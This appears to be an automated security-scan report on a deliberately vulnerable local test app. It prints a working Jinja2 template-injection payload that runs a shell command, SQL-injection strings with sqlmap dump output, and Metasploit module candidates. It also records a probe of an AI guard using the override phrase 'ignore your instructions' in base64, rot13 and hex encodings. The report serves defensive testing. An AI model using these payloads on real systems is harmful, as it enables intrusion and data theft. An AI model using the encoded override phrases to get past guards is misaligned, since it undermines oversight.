# Security scan — test-vuln-hard

- target: `http://127.0.0.1:8098` (local)
- isolation: direct — no Tor for local targets (Arti has no loopback route)
- strix: gemini-flash-lite · 0s · run strix/strix_runs/test-vuln-hard_671a
- started 2026-11-07T21:26:08Z · duration 133s

## Findings

### [CRITICAL] Server-Side Template Injection (SSTI) leading to RCE in /render

Server-Side Template Injection (SSTI) in the `/render` endpoint allows unauthenticated remote code execution via the `tpl` form parameter.

Agent PoC:

1. Send a POST request to `/render` with the form parameter `tpl={{config.__class__.__init__.__globals__['os'].popen('id').read()}}`.\n2. Observe command execution output in the HTTP response.

### [HIGH] SQL Injection in GET /orders sort parameter

The GET /orders endpoint directly interpolates the 'sort' query parameter into an SQL ORDER BY clause without sanitization or parameterization, allowing boolean-based blind SQL injection and data exfiltration.

Agent PoC:

1. Send GET request to /orders with a sort parameter containing a conditional CASE statement.
2. Observe different result rows ordering based on the boolean condition.

### [CRITICAL] SQL Injection in POST /orders/by-sku sku parameter

The POST /orders/by-sku endpoint directly interpolates the JSON 'sku' parameter into an SQL WHERE clause without parameterization, enabling SQL injection and full data exfiltration.

Agent PoC:

1. Send POST request to /orders/by-sku with JSON body `{"sku": "' OR 1=1 --"}`.
2. Observe all records returned in the response.

## Secret scan (betterleaks)

- **50 secret leak(s) found** (values redacted)

  - `generic-credential-uri` · /repo/app.log:4866
  - `generic-credential-uri` · /repo/app.log:4866
  - `generic-api-key` · /repo/app.log:5559
  - `generic-credential-uri` · /repo/app.log:8536
  - `generic-credential-uri` · /repo/app.log:8537
  - `generic-credential-uri` · /repo/app.log:8538
  - `generic-credential-uri` · /repo/app.log:8539
  - `generic-credential-uri` · /repo/app.log:8540
  - `generic-credential-uri` · /repo/app.log:8541
  - `generic-credential-uri` · /repo/app.log:8542
  - `generic-credential-uri` · /repo/app.log:8543
  - `generic-credential-uri` · /repo/app.log:8544
  - `generic-credential-uri` · /repo/app.log:8545
  - `generic-credential-uri` · /repo/app.log:8546
  - `generic-credential-uri` · /repo/app.log:8547

## Independent confirmation

- sqlmap: `{"url": "http://127.0.0.1:8098/orders?sort=1", "injectable": true, "rc": 0, "dbms": "SQLite", "techniques": ["boolean-based blind"], "tables": ["orders"], "dump_rc": 0, "dump_rows": 3, "dumped_table": "orders", "sensitive_exposed": true, "sample": ["| 1  | 3   | alpha | flag{orderby_ok} |", "| 2  | 7   | beta  | nothing          |", "| 3  | 1   | gamma | x                |"], "columns": "| id | qty | sku   | note             |"}`
- sqlmap (POST body): `{"url": "http://127.0.0.1:8098/orders/by-sku", "injectable": true, "rc": 0, "method": "POST", "data_template": "{\"sku\": \"1\"}", "dbms": "SQLite", "techniques": ["UNION query", "boolean-based blind"], "tables": ["orders"], "dump_rc": 0, "dump_rows": 3, "dumped_table": "orders", "sensitive_exposed": true, "sample": ["| 1  | 3   | alpha | flag{orderby_ok} |", "| 2  | 7   | beta  | nothing          |", "| 3  | 1   | gamma | x                |"], "columns": "| id | qty | sku   | note             |"}`
- injection proof (cmdi/traversal): `{"cmdi": [], "traversal": [], "default_exec": [], "requests": 18}`
- sstimap: `{"url": "http://127.0.0.1:8098/render", "vulnerable": true, "confidence": "high", "engine": "Jinja2", "rce": true, "rc": 0, "post_param": "tpl", "post_data_type": "form", "via": "POST body"}`
- xsstrike: `{"vectors": 0}`
- nmap: `{}`
- ffuf: paths=None
- nuclei: hits=None
- metasploit: `{"server": "Werkzeug/3.0.1 Python/3.12.3", "module": null, "rc": 0, "candidates": ["exploit/multi/http/werkzeug_debug_rce", "exploit/multi/http/werkzeug_debug_rce"]}`
- sweep: `{"candidates": 14, "sstimap_hits": [], "sstimap_low": [], "xsstrike_hits": []}`

## Guard-gap probe (tripwire)

- transforms flagged: 100% (flag>=0.6, block>=0.9)
- control ('ignore your instructions'): OK · composite 1.0
- guard gaps (below flag threshold): 0/12
  - identity: mean 0.6 · flag 100% · block 0%
  - base64: mean 0.6 · flag 100% · block 0%
  - base64x2: mean 0.6 · flag 100% · block 0%
  - rot13: mean 0.6 · flag 100% · block 0%
  - hex_escape: mean 0.6 · flag 100% · block 0%
  - unicode_escape: mean 0.6 · flag 100% · block 0%

## Since last scan

- new: 0 · persisting: 3 · resolved: 0 · active: 3
  - PERSISTING [3a4a07640157d8d1] Server-Side Template Injection (SSTI) leading to RCE in /render (first seen 2026-11-07T21:17:31Z)
  - PERSISTING [f0ccf758f6be1fe8] SQL Injection in GET /orders sort parameter (first seen 2026-11-07T21:17:31Z)
  - PERSISTING [d2208cf68e0ae9ad] SQL Injection in POST /orders/by-sku sku parameter (first seen 2026-11-07T21:17:31Z)

## Receipt

- receipt: `83cd6e68f7434cf6dbe78210c6e32646e543db10338dc994eea3c26607dc6e99`
- merkle: `2f1bc1b544ca5a7acc846c7d9d29e1980bd09997b1c5a6eebd8607d93f682316`
- chain_index: 4 · prev: `ef7f73d07294b3cf1ad0e4f5ad7a3bb4f93f0a46c6affd7f2084426688aec505`
- artifacts: 16 · diagnostics: 3
- verify: `python3 /opt/ares/okf_receipt.py verify /opt/ares/security_receipts/test-vuln-hard/83cd6e68f7434cf6.json --files`
